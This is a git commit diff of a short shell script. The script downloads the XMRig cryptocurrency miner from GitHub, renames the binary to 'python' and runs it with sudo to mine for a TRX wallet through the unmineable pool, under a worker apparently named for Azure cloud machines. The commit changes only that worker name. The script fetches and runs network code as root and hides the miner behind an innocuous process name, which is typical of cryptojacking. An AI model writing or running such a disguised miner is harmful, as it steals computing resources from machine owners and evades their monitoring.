8b5271a06364a6322f42e81c4297686855b5af8c
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-16 01:18:21 +0700

    Update DOGE_unminerable.sh

--- DOGE_unminerable.sh
+++ DOGE_unminerable.sh
@@ -2,4 +2,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux
 tar xf xmrig-6.15.0-linux-x64.tar.gz
 cd xmrig-6.15.0
 mv xmrig python
-sudo ./python -o rx.unmineable.com:3333 -a rx -k -u TRX:TEezfZSVJgdNM5Y1K828Ru7WoHtLjBSNMP.Azure_Cloud -p x
+sudo ./python -o rx.unmineable.com:3333 -a rx -k -u TRX:TEezfZSVJgdNM5Y1K828Ru7WoHtLjBSNMP.Azure_Cloud#auzd-t64o -p x
